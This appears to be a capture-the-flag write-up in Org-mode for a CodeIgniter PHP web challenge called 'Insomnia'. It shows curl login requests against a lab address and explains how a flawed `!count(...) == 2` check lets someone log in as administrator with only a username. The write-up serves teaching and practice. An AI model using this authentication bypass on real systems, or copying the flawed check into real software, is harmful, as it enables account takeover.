@@ -1,0 +1,163 @@
+:PROPERTIES:
+:ID:       87299109-6292-4eca-925d-5192b31896b3
+:END:
+#+TITLE: Insomnia
+#+AUTHOR: AsmArtisan256
+#+DATE: 07-01-2025
+
+#+OPTIONS: html-style:nil
+#+OPTIONS: html-scripts:nil
+
+#+OPTIONS: author:nil
+#+OPTIONS: email:nil
+#+OPTIONS: date:t
+#+OPTIONS: toc:nil
+
+#+PROPERTY: header-args :eval no
+
+#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="/style.css"/>
+
+#+EXPORT_FILE_NAME: insomnia
+
+
+I'm greeted with a website that has multiple pages, such as =Home=, =Sign In= and
+=Sign Up=. So I guess I can create an account and login. I'll start by creating account:
+
+#+DOWNLOADED: screenshot @ 2025-01-07 21:19:08
+#+attr_org: :width 600px
+[[file:writeup-img/2025-01-07_21-19-08_screenshot.png]]
+
+
+And now I can login:
+
+
+#+DOWNLOADED: screenshot @ 2025-01-07 21:19:44
+#+attr_org: :width 600px
+[[file:writeup-img/2025-01-07_21-19-44_screenshot.png]]
+
+Nothing interesting, very underwhelming! Hopefully, the downloaded files can
+show us something more. Right at the start, I can see that the web application
+was made using =CodeIgniter=, which uses =PHP=. The logic of each page resides in
+the controllers. The =ProfileController.php= seems to be the one that has the
+logic of the page that is shown after a user logs in. It is also the one that
+reads the flag and prints it out! But I have to be the user called
+=administrator=, and I feel it's same to assume that that user already exists.
+
+#+BEGIN_SRC php
+if ($username == "administrator") {
+    return view("ProfilePage", [
+      "username" => $username,
+      "content" => $flag,
+    ]);
+}
+#+END_SRC
+
+The =UserController.php= has the logic for the login page and the =login= function
+has some error handling and whatever. This is when I think it's best to get the
+login request and mess around with it. If I login successfully, I get an access token:
+
+#+BEGIN_SRC sh :results output
+curl 'http://94.237.51.26:52223/index.php/login' -X POST -H 'Content-Type: application/json' --data-raw '{"username":"AsmArtisan256","password":"XXXX"}'
+#+END_SRC
+
+#+BEGIN_SRC js
+{"message":"Login Succesful","token":"XXXX"}
+#+END_SRC
+
+If I use an empty password, it tells me that the user wasn't found:
+
+#+BEGIN_SRC sh :results output
+curl 'http://94.237.51.26:52223/index.php/login' -X POST -H 'Content-Type: application/json' --data-raw '{"username":"AsmArtisan256","password":""}'
+#+END_SRC
+
+#+BEGIN_SRC
+User not found
+#+END_SRC
+
+Then I tried adding a parameter, just to test it out, but now there isn't even output:
+
+#+BEGIN_SRC sh
+curl 'http://94.237.51.26:52223/index.php/login' -X POST -H 'Content-Type: application/json' --data-raw '{"username":"AsmArtisan256","password":"XXXX","test":"test"}'
+#+END_SRC
+
+Until I tested the scenario of just sending the username:
+
+#+BEGIN_SRC sh
+curl 'http://94.237.51.26:52223/index.php/login' -X POST -H 'Content-Type: application/json' --data-raw '{"username":"AsmArtisan256"}'
+#+END_SRC
+
+#+BEGIN_SRC js
+{"message":"Login Succesful", "token":"XXXX"}
+#+END_SRC
+
+Ok, wait a second, I just sent the username and it still gave me an access
+token? I guess I can just change the username to =administrator= and get that
+user's access token right? Yep.
+
+Although I found this just by chance, what actually happened? The
+=UserController.php= file has the =login= function that executes the previous
+request. It starts by connecting to the database, getting the JSON body,
+verifying if it has username and password and so on:
+
+#+BEGIN_SRC php
+public function login()
+{
+    $db = db_connect();
+    $json_data = request()->getJSON(true);
+    if (!count($json_data) == 2) {
+        return $this->respond("Please provide username and password", 404);
+    }
+    $query = $db->table("users")->getWhere($json_data, 1, 0);
+    $result = $query->getRowArray();
+
+    ................
+}
+#+END_SRC
+
+The =if= statement that verifies the number of parameters in the =JSON= body messed
+up, for some reason, and thought that only one parameter was valid enough to
+continue through the database logic. But the exclamation point before the
+function call makes all the difference:
+
+#+BEGIN_SRC php
+$c[0] = 1;
+var_dump(count($c));
+
+// => int(1)
+
+$c[0] = 1;
+var_dump(!count($c));
+
+// => bool(false)
+#+END_SRC
+
+So, according to the code above, ~false == 2~ is always a false statement,
+enabling us the possibility of logging in with just the username and getting the
+flag by using the resulting access token!
+
+
+* FOOTER                                                                                              :ignore:
+:PROPERTIES:
+:clearpage: t
+:END:
+#+BEGIN_EXPORT html
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">07-01-2025</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+#+END_EXPORT
